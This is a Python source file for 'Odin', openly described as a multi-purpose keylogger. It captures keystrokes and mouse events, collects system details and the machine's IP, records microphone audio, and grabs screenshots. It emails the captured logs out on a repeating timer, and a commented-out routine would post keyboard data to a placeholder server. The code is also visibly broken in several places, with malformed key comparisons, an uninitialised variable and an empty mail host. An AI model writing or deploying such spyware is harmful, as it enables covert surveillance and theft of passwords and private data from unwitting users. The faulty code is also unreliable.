"""

The Odin is made to fill the role of a multi-purpose keylogger.

We will continue to upgrade our tool to make it optimal and better.

Developed by ErWin

"""

from cgitb import text
from ipaddress import ip_address
from select import select
from sys import modules
from turtle import onclick, onkeypress
from typing_extensions import Self
import os
from pynput import keyboard
import logging
import platform
import socket
import wave
from pynput.keyboard import Key, Listener
import glob
import threading
import smtplib
import requests
import json
import smtplib
import ssl
from email.message import EmailMessage
"""
try:            # <-- Using "try-except" at the start helps the user not to download every module one by one.
    import os
    from pynput import keyboard
    import logging
    import platform
    import socket
    import wave
    from pynput.keyboard import Key, Listener
    import glob
    import threading
    import smtplib
    import requests
    import json
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText


    import pyscreenshot
    import sounddevice as sd




except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot" , "soundddevice" , "pynput"]
    call("pip3       install " + ' '.join(modules) , shell=True) 

"""
#               <--------   ----  ODIN M1  ----   -------->

# Forming a variable for the captured information. We will send this to our server.
captured_info = ''



"""
# Server Specifications
ip_address = "ip.ip.ip.ip"
port_number_value = "8080"
"""
# Time interval for the program. Based on seconds.
time_interval_value = 10






#####        ------------------------------         #####
#####                                               #####
#####              SERVER SPECIFICATIONS            #####
#####                                               #####
#####        ------------------------------         #####




# Preparing the server that we are gonna send our captured information

#class Server:
def send_info_req_swside():
        try:
            # To send the info that we wanted, first we need to convert the Python object into a JSON string. After that we are gonna be able to send it to our server.
            payload = json.dumps({"keyboardData" : text})



            # Values of ip_address and port number
            #r = requests.post(f"https//{ip_address}:{port_number_value}" , data=payload , headers={"Content-Type" : "application/json"})



            # Setting a timer with a recursive function up there, called send_info_req.
            timer = threading.Timer(time_interval_value , send_info_req_swside)


            # Timer thread starts.
            timer.start()



        except:
            print("Couldn't Complete the Request, Try Again Later.")


#####        ------------------------------         #####
#####                                               #####
#####              SERVER SPECIFICATIONS            #####
#####                                               #####
#####        ------------------------------         #####






# Classing Keylogger Odin

EMAIL_ADDRESS = ""     # <--- WILL BE UPDATED!!!
EMAIL_PASSWORD = "" #<---- WILL BE DELETE
EMAIL_RECEIVER= ""
global port 
port = 465 
SEND_REPORT_EVERY_BASED_ON_SCNDS = "60"



class KeyloggerOdin:
    def __init__(self , time_interval_value , email , password):
        self.interval = time_interval_value
        self.log = "Odin has been started..."
        self.email = email
        self.password = password



    def appendlog(self , string):
        self.log = self.log + string



    def on_click(self , x , y):
        current_click = logging.info("Mouse moved to {} {} ".format(x , y))
        self.appendlog(current_click)

    

    def on_scroll(self , x , y):
        current_scroll = logging.info("Mouse moved to {} {} ".format(x , y))
        self.appendlog(current_scroll)


    def on_right_click(self , x , y):
        current_right_click = logging.info("Mouse moved to {} {} ".format(x , y))
        self.appendlog(current_right_click)



    def keybd_info(self , key):
        global text


        if key == keyboard.Key.enter():
            text += "\n"        # It presses enter in the place where all the data is being saved.
        
        elif key == keyboard.Key.tab():
            text += "\t"        # It presses tab in the place where all the data is being saved.
        
        elif key == keyboard.Key.space():
            text += " "
        
        elif key == keyboard.Key.shift():
            pass

        elif key == keyboard.Key.alt():
            pass

        #elif key == keyboard.Key.caps_lock():      <-- Will be updated...
            #text += "{key}".capitalize

        elif key == keyboard.Key.ctrl_l() or key == keyboard.Key.ctrl_r():
            pass

        elif key == keyboard.Key.backspace and len(text) == 0:
            pass

        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]        # Deletes the last space or letter before the text line like a normal backspace.
        
        elif key == keyboard.Key.esc:
            return False
        
        else:
            text += str(key).strip("'")
        
        self.appendlog(text)




    # Send Email Function
    
    def send_mail_section(self , email , password , message):
        sender = EMAIL_ADDRESS
        receiver = EMAIL_RECEIVER

        # There is an ongoing error with mail server, will be fixed with an update.

        mail = f"""\
        Subject: Notification from Odin...
        To: {receiver}
        From: {sender}
        
        Odin Keylogger - by the Department of Defense of Erwinium\n """

        context = ssl.create_default_context()
        mail += message
        with smtplib.SMTP_SSL('', port, context=context) as smtp:      # 1025 is the port value and 127.0.0.1 is the IP for the protonmail.com
            smtp.login(EMAIL_ADDRESS , EMAIL_PASSWORD)
            smtp.sendmail(EMAIL_ADDRESS , EMAIL_RECEIVER , message)



    # Report Function

    def report_section(self):
        self.send_mail_section(self.email , self.password , "\n\n" + self.log)
        self.log = " "
        timer = threading.Timer(self.interval , self.report_section)
        timer.start()





    # Getting the system information.

    def cap_system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        platf = platform.processor()
        system = platform.system()
        machine = platform.machine()
        version = platform.version()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(platf)
        self.appendlog(system)
        self.appendlog(machine)
        self.appendlog(version)

    
    # Getting the microphone input below there.
    
    def microphone_input(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY_BASED_ON_SCNDS
        obj = wave.open('sound.wav' , 'w')
        obj.setnchannels(1)
        obj.setsampwidth(2)
        obj.setframerate(fs)
        captured_recording = sd.rec(int(seconds * fs) , samplerate = fs , channels = 2)
        obj.writeframesraw(captured_recording)
        sd.wait()

        self.send_mail_section(email = EMAIL_ADDRESS , password = EMAIL_PASSWORD , message = obj)

    
    def captured_screenshot(self):
        img = pyscreenshot.grab()
        self.send_mail_section(email = EMAIL_ADDRESS , password = EMAIL_PASSWORD , message = img)


    def run(self):
        keyboard_listener = keyboard.Listener(on_press = self.keybd_info)
        with keyboard_listener:
            self.report_section()
            keyboard_listener.join()
            with Listener(on_click = self.on_click , on_scroll = self.on_scroll , on_right_click = self.on_right_click) as mouse_listener:
                mouse_listener.join()



odin = KeyloggerOdin(SEND_REPORT_EVERY_BASED_ON_SCNDS , EMAIL_ADDRESS , EMAIL_PASSWORD)
odin.run()






"""with keyboard.Listener(keybd_info = onkeypress) as listener:
        
    # Below this line , we are gonna send a post request to our web server. Will be updated in the near future.
    send_info_req_swside()

    listener.join()"""